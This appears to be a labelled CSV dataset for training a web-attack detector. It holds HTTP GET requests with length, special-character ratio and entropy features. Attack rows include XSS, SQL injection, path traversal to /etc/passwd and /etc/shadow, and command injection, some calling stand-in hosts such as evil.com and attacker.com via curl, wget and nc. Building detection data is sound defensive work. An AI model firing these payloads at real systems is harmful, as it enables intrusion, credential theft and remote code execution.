payload,label,length,special_ratio,entropy
GET /register?size=medium&page=1 HTTP/1.1,0,41.0,0.024390243902439025,4.385008029473517
GET /post?q=<video><source onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.699833468881675
GET /api/user?user=1' AND '1'='2 HTTP/1.1,1,41.0,0.0975609756097561,4.2963379801223045
GET /login?user=' OR 1=1 -- HTTP/1.1,1,36.0,0.027777777777777776,4.326465890981192
GET /dashboard?sort=name&filter=active HTTP/1.1,0,47.0,0.02127659574468085,4.639279277025428
GET /dashboard?color=blue&limit=10&q=search+term HTTP/1.1,0,57.0,0.03508771929824561,4.722640671793787
GET /blog?filter=active&q=search+term&category=electronics HTTP/1.1,0,67.0,0.029850746268656716,4.648033505522032
GET /ping?cmd=hostname; sleep 10 HTTP/1.1,1,41.0,0.024390243902439025,4.5706090166549025
GET /dashboard?page=1 HTTP/1.1,0,30.0,0.0,4.231401845392172
GET /search?user=' OR '1'='1'/* HTTP/1.1,1,40.0,0.125,4.193942707918268
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /profile?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.825553479199118
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /dashboard?sort=name&category=electronics HTTP/1.1,0,54.0,0.018518518518518517,4.587858798299508
GET /document?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.415337750470313
GET /api/user?user=1' AND '1'='2 HTTP/1.1,1,41.0,0.0975609756097561,4.2963379801223045
GET /blog?color=blue HTTP/1.1,0,29.0,0.0,4.090234012145145
GET /contact.html?filter=active&category=electronics&page=1 HTTP/1.1,0,68.0,0.029411764705882353,4.558709209217967
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /blog?size=medium&filter=active&color=blue HTTP/1.1,0,55.0,0.03636363636363636,4.65637238659871
GET /register?size=medium&sort=name&id=123 HTTP/1.1,0,51.0,0.0392156862745098,4.532445626531937
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /about.html?sort=name&q=search+term HTTP/1.1,0,48.0,0.020833333333333332,4.589661719245796
GET /dashboard?q=search+term HTTP/1.1,0,37.0,0.0,4.4455435681562365
GET /profile?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.833616975397235
GET /login?size=medium&q=search+term HTTP/1.1,0,45.0,0.022222222222222223,4.730416151740999
GET /ping?cmd=hostname$(whoami) HTTP/1.1,1,40.0,0.075,4.684183719779188
GET /settings?price=100&category=electronics&filter=active HTTP/1.1,0,67.0,0.029850746268656716,4.522804258871837
GET /products.html?color=blue HTTP/1.1,0,38.0,0.0,4.45148902643068
GET /login?limit=10&filter=active HTTP/1.1,0,42.0,0.023809523809523808,4.472574792228982
GET /contact.html?category=electronics&color=blue HTTP/1.1,0,58.0,0.017241379310344827,4.509035633790892
GET /login?filter=active&limit=10&page=1 HTTP/1.1,0,49.0,0.04081632653061224,4.525238864824306
GET /api/user?user=%27;%20DROP%20TABLE%20users-- HTTP/1.1,1,57.0,0.017543859649122806,4.678952513974961
GET /file?file=....//....//....//etc/passwd HTTP/1.1,1,52.0,0.0,3.8130394036575916
GET /profile?sort=name HTTP/1.1,0,31.0,0.0,4.413716068381602
GET /file?file=../../../../../../etc/passwd HTTP/1.1,1,52.0,0.0,3.8130394036575916
GET /profile?q=<body onload=alert('XSS')> HTTP/1.1,1,50.0,0.12,4.838562939644916
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /register?id=123 HTTP/1.1,0,29.0,0.0,4.1852301329094015
GET /blog?sort=name&page=1&filter=active HTTP/1.1,0,49.0,0.04081632653061224,4.639721323486283
GET /contact.html?id=123&price=100 HTTP/1.1,0,43.0,0.023255813953488372,4.629412138272088
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?q=<body onload=alert('XSS')> HTTP/1.1,1,50.0,0.12,4.838562939644916
GET /comment?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.931401845392171
GET /docs?price=100 HTTP/1.1,0,28.0,0.0,4.182005814760214
GET /register?filter=active HTTP/1.1,0,36.0,0.0,4.252715278979704
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /comment?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,76.0,0.07894736842105263,4.719572540832782
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /profile?filter=active&color=blue&page=1 HTTP/1.1,0,53.0,0.03773584905660377,4.517751294423244
GET /api/products?size=medium HTTP/1.1,0,38.0,0.0,4.4514890264306795
GET /contact.html?q=search+term&category=electronics&color=blue HTTP/1.1,0,72.0,0.027777777777777776,4.5844391970197975
GET /api/products?price=100&color=blue&id=123 HTTP/1.1,0,54.0,0.037037037037037035,4.643052316657769
GET /contact.html?color=blue&filter=active&category=electronics HTTP/1.1,0,72.0,0.027777777777777776,4.544208683794245
GET /api/user?user=1' AND '1'='2 HTTP/1.1,1,41.0,0.0975609756097561,4.2963379801223045
GET /api/products?page=1 HTTP/1.1,0,33.0,0.0,4.346831997884095
GET /docs?id=123 HTTP/1.1,0,25.0,0.0,4.023465189601646
GET /command?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,56.0,0.017857142857142856,4.554873395496577
GET /download?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.170044500340504
GET /contact.html?size=medium HTTP/1.1,0,38.0,0.0,4.504120605378049
GET /search?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,53.0,0.07547169811320754,4.632843095746069
GET /profile?q=<script>alert(document.cookie)</script> HTTP/1.1,1,63.0,0.09523809523809523,4.766729724984195
GET /profile?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.900025150061047
GET /post?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,51.0,0.0784313725490196,4.655282146267043
GET /search?filter=active&color=blue HTTP/1.1,0,45.0,0.022222222222222223,4.5358630961373665
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /settings?page=1&q=search+term&id=123 HTTP/1.1,0,50.0,0.04,4.663465189601648
GET /search?q=<script>alert('XSS')</script> HTTP/1.1,1,52.0,0.15384615384615385,4.704777458317682
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /image?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,59.0,0.0,4.360771016449623
GET /file?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,58.0,0.0,4.27538703061342
GET /api/products?filter=active&sort=name&color=blue HTTP/1.1,0,61.0,0.03278688524590164,4.663783034035928
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /api/products?sort=name&price=100 HTTP/1.1,0,46.0,0.021739130434782608,4.571943749300114
GET /blog?sort=name&color=blue&price=100 HTTP/1.1,0,49.0,0.04081632653061224,4.624315456095191
GET /docs?filter=active HTTP/1.1,0,32.0,0.0,4.413909765557392
GET /api/products?id=123&limit=10&price=100 HTTP/1.1,0,52.0,0.038461538461538464,4.565945132377804
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /products.html?q=search+term&color=blue HTTP/1.1,0,52.0,0.019230769230769232,4.651798852506846
GET /about.html?sort=name HTTP/1.1,0,34.0,0.0,4.395998870534841
GET /exec?cmd=hostname| curl http://evil.com HTTP/1.1,1,53.0,0.018867924528301886,4.66632304878036
GET /about.html?sort=name&color=blue&category=electronics HTTP/1.1,0,66.0,0.030303030303030304,4.574792324514653
GET /index.html?category=electronics&page=1&limit=10 HTTP/1.1,0,61.0,0.03278688524590164,4.70730798538107
GET /products.html?filter=active&limit=10 HTTP/1.1,0,50.0,0.02,4.64637013015618
GET /docs?page=1&filter=active&limit=10 HTTP/1.1,0,48.0,0.041666666666666664,4.605388542207536
GET /api/users?id=123 HTTP/1.1,0,30.0,0.0,4.231401845392171
GET /download?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.263715777995571
GET /dashboard?price=100 HTTP/1.1,0,33.0,0.0,4.392582755590972
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /register?category=electronics&size=medium HTTP/1.1,0,55.0,0.01818181818181818,4.532795450559983
GET /dashboard?q=search+term&category=electronics&sort=name HTTP/1.1,0,68.0,0.029411764705882353,4.61483099584714
GET /blog?size=medium&id=123&page=1 HTTP/1.1,0,44.0,0.045454545454545456,4.572623663895163
GET /login?sort=name&page=1&limit=10 HTTP/1.1,0,45.0,0.044444444444444446,4.508193929518775
GET /comment?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.674719090246699
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /command?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,56.0,0.017857142857142856,4.3814893607725285
GET /document?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.348822160974294
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /api/users?filter=active HTTP/1.1,0,37.0,0.0,4.371087149178845
GET /about.html?sort=name&category=electronics&filter=active HTTP/1.1,0,69.0,0.028985507246376812,4.627643160149414
GET /products.html?q=search+term HTTP/1.1,0,41.0,0.0,4.570609016654903
GET /api/user?user=admin'/* HTTP/1.1,1,36.0,0.027777777777777776,4.3711781263822145
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /comment?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,60.0,0.1,4.737907837484891
GET /blog?sort=name&page=1 HTTP/1.1,0,35.0,0.02857142857142857,4.4575751596784805
GET /docs?id=123 HTTP/1.1,0,25.0,0.0,4.023465189601646
GET /profile?user=1' ORDER BY 10-- HTTP/1.1,1,43.0,0.023255813953488372,4.580578057571859
GET /search?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,60.0,0.06666666666666667,4.604574504151557
GET /ping?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.532678211285537
GET /search?price=100&id=123&sort=name HTTP/1.1,0,47.0,0.0425531914893617,4.6392792770254285
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /file?file=....//....//....//etc/passwd HTTP/1.1,1,52.0,0.0,3.8130394036575916
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?user=%27%20UNION%20SELECT%20NULL-- HTTP/1.1,1,56.0,0.0,4.789148671903073
GET /image?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,52.0,0.0,4.4473385747039735
GET /dashboard?price=100 HTTP/1.1,0,33.0,0.0,4.392582755590972
"GET /profile?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,69.0,0.07246376811594203,5.005061188844579
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /register?id=123&limit=10 HTTP/1.1,0,38.0,0.02631578947368421,4.385956789702442
GET /api/products?category=electronics HTTP/1.1,0,47.0,0.0,4.522050021614215
GET /profile?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,76.0,0.07894736842105263,4.777891008010804
GET /profile?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,84.0,0.023809523809523808,4.839011923790011
GET /docs?id=123 HTTP/1.1,0,25.0,0.0,4.023465189601646
GET /products.html?filter=active HTTP/1.1,0,41.0,0.0,4.607432797248243
GET /api/users?filter=active&sort=name HTTP/1.1,0,47.0,0.02127659574468085,4.548541776887334
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /about.html?q=search+term HTTP/1.1,0,38.0,0.0,4.523986065961298
GET /register?color=blue&filter=active HTTP/1.1,0,47.0,0.02127659574468085,4.477372032888474
GET /ping?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,61.0,0.03278688524590164,4.719683190334569
GET /profile?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.825553479199118
GET /search?user=' OR 'a'='a HTTP/1.1,1,37.0,0.10810810810810811,4.195675662809304
GET /api/user?user=admin' -- HTTP/1.1,1,37.0,0.02702702702702703,4.391489514102183
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /profile?filter=active&limit=10&color=blue HTTP/1.1,0,55.0,0.03636363636363636,4.513203241490942
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /api/products?sort=name&limit=10&filter=active HTTP/1.1,0,59.0,0.03389830508474576,4.653770278785266
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /exec?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,61.0,0.03278688524590164,4.682557575474071
GET /register?sort=name&page=1&limit=10 HTTP/1.1,0,48.0,0.041666666666666664,4.464661719245797
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /login?user=1%27%20AND%20%271%27=%271 HTTP/1.1,1,50.0,0.0,4.376174630069642
GET /search?user=%27%20WAITFOR%20DELAY%20%2700:00:05%27-- HTTP/1.1,1,66.0,0.0,4.714478399497588
GET /blog?page=1&color=blue HTTP/1.1,0,36.0,0.027777777777777776,4.30827083453526
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /register?sort=name&category=electronics&id=123 HTTP/1.1,0,60.0,0.03333333333333333,4.566830129043384
GET /register?filter=active&price=100&size=medium HTTP/1.1,0,58.0,0.034482758620689655,4.544518762931295
GET /dashboard?color=blue&id=123 HTTP/1.1,0,41.0,0.024390243902439025,4.552197126358232
GET /exec?cmd=hostname| whoami HTTP/1.1,1,39.0,0.02564102564102564,4.490029141717277
GET /search?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.68082653147046
GET /blog?page=1 HTTP/1.1,0,25.0,0.0,4.023465189601646
GET /settings?page=1&size=medium HTTP/1.1,0,41.0,0.024390243902439025,4.4058556629435985
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /docs?limit=10 HTTP/1.1,0,27.0,0.0,4.1804513908921015
GET /search?user=') OR ('1'='1 HTTP/1.1,1,39.0,0.15384615384615385,4.291687154704211
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /image?file=....//....//....//etc/passwd HTTP/1.1,1,53.0,0.0,3.913867315824671
GET /comment?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,56.0,0.14285714285714285,4.662016252639434
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /api/products?id=123&page=1&filter=active HTTP/1.1,0,54.0,0.037037037037037035,4.657031714845981
GET /search?q=search+term HTTP/1.1,0,34.0,0.0,4.256149238118268
GET /register?filter=active HTTP/1.1,0,36.0,0.0,4.252715278979704
GET /login?page=1&limit=10&color=blue HTTP/1.1,0,46.0,0.043478260869565216,4.544876086303668
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /run?cmd=hostname$(whoami) HTTP/1.1,1,39.0,0.07692307692307693,4.682587475161557
GET /products.html?price=100&q=search+term&category=electronics HTTP/1.1,0,72.0,0.027777777777777776,4.726683293133495
GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1,1,62.0,0.0967741935483871,4.770582149334389
GET /post?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,81.0,0.024691358024691357,4.7904678314479865
GET /index.html?sort=name&limit=10 HTTP/1.1,0,43.0,0.023255813953488372,4.547789463752857
GET /login?user=1' AND '1'='1 HTTP/1.1,1,38.0,0.10526315789473684,4.290966250901473
GET /profile?user=admin%27/* HTTP/1.1,1,37.0,0.0,4.682162149295791
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /index.html?id=123 HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /command?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,52.0,0.038461538461538464,4.334679141051594
GET /ping?cmd=hostname$(whoami) HTTP/1.1,1,40.0,0.075,4.684183719779188
GET /dashboard?sort=name HTTP/1.1,0,33.0,0.0,4.331976694984911
GET /profile?color=blue HTTP/1.1,0,32.0,0.0,4.241729296672174
"GET /login?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,67.0,0.07462686567164178,4.970804444409202
GET /docs?category=electronics HTTP/1.1,0,39.0,0.0,4.406821128952238
GET /search?id=123&sort=name&size=medium HTTP/1.1,0,49.0,0.04081632653061224,4.624315456095192
GET /api/products?id=123 HTTP/1.1,0,33.0,0.0,4.369707376737534
GET /about.html?page=1&filter=active&color=blue HTTP/1.1,0,56.0,0.03571428571428571,4.632811395078725
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /settings?page=1&sort=name HTTP/1.1,0,39.0,0.02564102564102564,4.368108949354111
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /profile?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.900025150061047
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /ping?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.532678211285537
GET /search?user=' OR 1=1 -- HTTP/1.1,1,37.0,0.02702702702702703,4.226628285180294
GET /api/users?color=blue&sort=name HTTP/1.1,0,44.0,0.022727272727272728,4.538310595615005
GET /contact.html?q=search+term HTTP/1.1,0,40.0,0.0,4.434183719779189
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /api/products?color=blue&price=100 HTTP/1.1,0,47.0,0.02127659574468085,4.548541776887334
GET /profile?user=1' AND '1'='2 HTTP/1.1,1,40.0,0.1,4.403055907333275
GET /index.html?category=electronics HTTP/1.1,0,45.0,0.0,4.5970828184076655
GET /post?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1,1,59.0,0.03389830508474576,4.698332829346123
GET /profile?user=admin' -- HTTP/1.1,1,36.0,0.027777777777777776,4.572431251322118
GET /dashboard?page=1&limit=10 HTTP/1.1,0,39.0,0.02564102564102564,4.580023372597455
GET /api/products?q=search+term HTTP/1.1,0,40.0,0.0,4.5653115322251026
GET /index.html?q=search+term&color=blue&size=medium HTTP/1.1,0,61.0,0.03278688524590164,4.762143689773634
GET /command?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,52.0,0.038461538461538464,4.334679141051594
GET /login?user=1' AND '1'='2 HTTP/1.1,1,38.0,0.10526315789473684,4.385956789702442
GET /image?file=..;/..;/..;/etc/passwd HTTP/1.1,1,47.0,0.06382978723404255,4.290207533268688
GET /profile?limit=10 HTTP/1.1,0,30.0,0.0,4.231401845392171
GET /register?id=123&color=blue HTTP/1.1,0,40.0,0.025,4.546439344671016
GET /exec?cmd=hostname`id` HTTP/1.1,1,35.0,0.05714285714285714,4.4575751596784805
GET /profile?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.751044275113815
GET /api/products?color=blue&filter=active&size=medium HTTP/1.1,0,63.0,0.031746031746031744,4.675482011303966
GET /api/user?user=admin%27/* HTTP/1.1,1,38.0,0.0,4.491219947597179
GET /register?size=medium HTTP/1.1,0,34.0,0.0,4.219528282299547
GET /login?color=blue&size=medium&limit=10 HTTP/1.1,0,51.0,0.0392156862745098,4.571661312806446
GET /post?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,56.0,0.07142857142857142,4.5683535294637805
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /login?user=' UNION SELECT * FROM users-- HTTP/1.1,1,54.0,0.018518518518518517,4.770419734409208
GET /api/products?page=1&q=search+term&filter=active HTTP/1.1,0,61.0,0.03278688524590164,4.702969255766472
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /post?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,81.0,0.024691358024691357,4.7904678314479865
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
"GET /search?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,56.0,0.017857142857142856,4.509657878074444
GET /post?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,53.0,0.1509433962264151,4.697181011486014
GET /about.html?sort=name HTTP/1.1,0,34.0,0.0,4.395998870534841
GET /document?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.415337750470313
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /api/user?user=' OR '1'='1'/* HTTP/1.1,1,42.0,0.11904761904761904,4.193161994764468
GET /api/user?user=1%27%20AND%20%271%27=%272 HTTP/1.1,1,53.0,0.0,4.319033011864008
GET /search?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,60.0,0.06666666666666667,4.604574504151557
